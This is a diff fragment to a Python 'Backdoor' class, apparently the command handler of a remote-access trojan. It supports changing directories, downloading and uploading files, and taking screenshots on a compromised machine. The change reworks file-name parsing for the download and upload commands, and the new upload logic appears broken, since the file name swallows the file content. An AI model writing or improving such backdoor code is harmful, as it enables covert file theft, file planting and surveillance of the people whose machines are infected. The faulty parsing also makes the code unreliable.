@@ -64,9 +64,10 @@ class Backdoor:
                     path = command.replace("cd ", "")
                     command_result = self.change_working_directory_to(path)
                 elif command.split()[0] == "download":
-                    command_result = self.read_file(command.split()[1])
+                    file_name = command.replace("download ", "")
+                    command_result = self.read_file(file_name)
                 elif command.split()[0] == "upload":
-                    file_name = command.split()[1]
+                    file_name = command.replace("upload ", "")
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
